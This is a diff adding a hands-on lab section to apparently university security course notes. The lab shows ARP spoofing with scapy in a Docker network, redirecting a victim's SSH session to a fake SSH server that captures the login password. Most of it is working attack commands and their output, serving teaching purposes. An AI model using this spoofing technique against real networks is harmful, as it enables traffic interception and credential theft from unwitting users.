@@ -177,3 +177,219 @@ image::arp.svg[width=500, float=left]
 An attacker may also use ARP packets to impersonate another machine on the network, such as a gateway router.
 By repeatedly sending out ARP packets, _gratuitous arp_, redirecting packets bound for the gateway's IP to the attackers MAC address an attacker can set up a MitM scenario.
 This is particularly difficult because depending on the TTL of the ARP cache it may take up to 20 minutes for normal network operations to resume.
+
+== MitM Lab
+
+In this lab we will use a fake SSH server, https://github.com/jaksi/sshesame[sshesame], and an interactive packet manipulation program, https://scapy.net/[scapy], to disrupt an ongoing SSH session between victim and server, position ourself in the middle of the traffic, and capture the username and password victim is using.
+
+WARNING: For this lab our IP address are configured statically and are known to the attacker.
+         It is also assumed that the attacker is on the local network.
+         Lastly victim has been poorly configured to ignore changes to the host key.
+         This is not entirely unreasonable as many users just ignore the warnings and clear out the known_hosts file.
+
+.IP Addresses Used
+|===
+|Name|IP Address
+
+|server|172.20.0.5
+|victim|172.20.0.6
+|attacker|172.20.0.7
+
+|===
+
+We'll start by _executing_ (recall that at this point it's already running sshesame in the background) a BASH shell on attacker and configuring it to accept packets not only for its own IP address, but also for the server's IP address.
+Once traffic is routed to us, this will allow attacker to also respond to packets destined for 172.20.0.5.
+
+.attacker
+[source, console]
+----
+PS C:\Users\rxt1077\it230\labs\scapy> docker-compose exec attacker bash
+root@5195de3d330c:/# ip addr add 172.20.0.5 dev eth0
+root@5195de3d330c:/# ip addr
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+2: tunl0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
+    link/ipip 0.0.0.0 brd 0.0.0.0
+3: sit0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
+    link/sit 0.0.0.0 brd 0.0.0.0
+347: eth0@if348: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
+    link/ether 02:42:ac:14:00:07 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 172.20.0.7/24 brd 172.20.0.255 scope global eth0 <1>
+       valid_lft forever preferred_lft forever
+    inet 172.20.0.5/32 scope global eth0 <2>
+       valid_lft forever preferred_lft forever
+----
+<1> This is the IP we started with
+<2> This is an additional IP that attacker believes it has
+
+Now that the attacker system is configured, we'll start up `scapy` interactively:
+
+.attacker
+[source, text]
+----
+root@5195de3d330c:/# scapy
+INFO: Can't import matplotlib. Won't be able to plot.
+INFO: Can't import PyX. Won't be able to use psdump() or pdfdump().
+INFO: No IPv6 support in kernel
+INFO: Can't import python-cryptography v1.7+. Disabled WEP decryption/encryption. (Dot11)
+INFO: Can't import python-cryptography v1.7+. Disabled IPsec encryption/authentication.
+WARNING: IPython not available. Using standard Python shell instead.
+AutoCompletion, History are disabled.
+
+                     aSPY//YASa
+             apyyyyCY//////////YCa       |
+            sY//////YSpcs  scpCY//Pp     | Welcome to Scapy
+ ayp ayyyyyyySCP//Pp           syY//C    | Version 2.4.5
+ AYAsAYYYYYYYY///Ps              cY//S   |
+         pCCCCY//p          cSSps y//Y   | https://github.com/secdev/scapy
+         SPPPP///a          pP///AC//Y   |
+              A//A            cyP////C   | Have fun!
+              p///Ac            sC///a   |
+              P////YCpc           A//A   | To craft a packet, you have to be a
+       scccccp///pSP///p          p//Y   | packet, and learn how to swim in
+      sY/////////y  caa           S//P   | the wires and in the waves.
+       cayCyayP//Ya              pY/Ya   |        -- Jean-Claude Van Damme
+        sY/PsY////YCc          aC//Yp    |
+         sc  sccaCY//PCypaapyCP//YSs
+                  spCPY//////YPSps
+                       ccaacs
+>>>
+----
+
+You'll notice that scapy's prompt is >>>, just like python because it _is_ python.
+Since we're working in python, let's make our lives easier by defining a few simple variables:
+
+.attacker
+[source, text]
+----
+>>> server_ip = "172.20.0.5" <1>
+>>> victim_ip = "172.20.0.6"
+----
+<1> IPv4 addresses are strings in scapy
+
+Now we are going to craft and send a broadcast ethernet frame with an ARP "who-has" request for the server's IP address.
+The result will tell use what server's MAC address is:
+
+.attacker
+[source, text]
+----
+>>> whohas = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=server_ip) <1>
+>>> whohas.show()
+###[ Ethernet ]###
+  dst       = ff:ff:ff:ff:ff:ff
+  src       = 02:42:ac:14:00:07
+  type      = ARP
+###[ ARP ]###
+     hwtype    = 0x1
+     ptype     = IPv4
+     hwlen     = None
+     plen      = None
+     op        = who-has
+     hwsrc     = 02:42:ac:14:00:07
+     psrc      = 172.20.0.7
+     hwdst     = 00:00:00:00:00:00
+     pdst      = 172.20.0.5
+
+>>> ans, unans = srp(whohas) <2>
+----
+<1> Scapy uses the '/' operator to nest protocols.
+    This is an ARP packet _in_ an Ethernet frame.
+<2> The `srp` function sends _and_ receives layer 2 traffic.
+    It's response is a tuple of answered packets and unanswered packets.
+
+Now we should have our answer in `ans` but it is burried in an list of QueryAnswer structures and needs to be unpacked a bit.
+Let's get it out and put it in a variable called `server_mac`.
+
+.attacker
+[source, text]
+----
+>>> server_mac = ans[0][1].src <1>
+>>> server_mac
+'02:42:ac:14:00:05' <2>
+----
+<1> This is the first response, 0, answer section, 1, source address of the machine that responded to our query.
+    Feel free to explore the structure more on the command line.
+<2> This was the MAC address I found, but yours may be different.
+
+This is how an ARP exchange is supposed to work.
+We broadcast out asking what MAC we should use for a certain IP and we get a response _from the person who legitimately has that MAC and IP_.
+Now we'll craft a new packet for the victim to find out their MAC address and store it in `victim_mac`:
+
+.attacker
+[source, text]
+----
+>>> whohas = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=victim_ip) <1>
+>>> ans, unans = srp(whohas)
+Begin emission:
+Finished sending 1 packets.
+*
+Received 1 packets, got 1 answers, remaining 0 packets
+>>> victim_mac = ans[0][1].src
+>>> victim_mac
+'02:42ac:14:00:06'
+----
+<1> Don't forget to change the IP to the victim_ip!
+
+Now we have everything we need to create an ARP packet telling the victim to send traffic to us when they are trying to access servers IP:
+
+.attacker
+[source, text]
+----
+>>> victim_ip, victim_mac, server_ip, server_mac
+('172.20.0.6', '02:42:ac:14:00:06', '172.20.0.5', '02:42:ac:14:00:05')
+----
+
+Now let's make and view an evil ARP packet:
+
+.attacker
+[source, text]
+----
+>>> bad_arp = ARP(op=2, pdst=victim_ip, psrc=server_ip, hwdst=victim_mac)
+>>> bad_arp
+<ARP  op=is-at psrc=172.20.0.5 hwdst=02:42:ac:14:00:06 pdst=172.20.0.6 |>
+----
+
+This packet posits itself as coming from the server, it is aimed at the victim in both IP and MAC, but the MAC address that will be used to send it is ours.
+This means the victim will update their ARP cache such that frames destined for server go to attacker.
+This effectively reroutes all layer 2 traffic that was going to the server from the victim.
+
+Go ahead an send that ARP packet:
+
+.attacker
+[source, text]
+----
+>>> send(bad_arp)
+.
+Sent 1 packets.
+----
+
+Now go back to the victim terminal with the SSH connection to server and try typing something.
+As soon as SSH has to send data, you will get a broken pipe error and the connection will drop.
+Faced with such a problem, what do you think most users will do?
+Probably try to reconnect, let's try that too.
+Remember the password is "password".
+
+.victim
+[source, text]
+----
+You are now logged into 'server' (presumably from 'victim') via SSH for this assignment.
+Leave this connection open while you experiment with scapy from 'attacker'.
+bf9ebe42a108:~# client_loop: send disconnect: Broken pipe <1>
+bash-5.0# ssh server
+Warning: Permanently added 'server,172.20.0.5' (ECDSA) to the list of known hosts.
+root@server's password:
+#
+----
+<1> This happened when they tried to type something right after we sent the malicious ARP
+
+Wait, that prompt looks a little different and where's the message about staying logged in?
+It turns out the victim actually signed into our fake SSH server and their username and password were logged!
+Take a look at the output from the terminal running `docker-compose up`, you'll see the credentials entered:
+
+.docker-compose up terminal
+[source, text]
+----
+attacker_1  | 2021/10/07 01:21:41 [172.20.0.6:60252] authentication for user "root" with password "password" accepted
+----
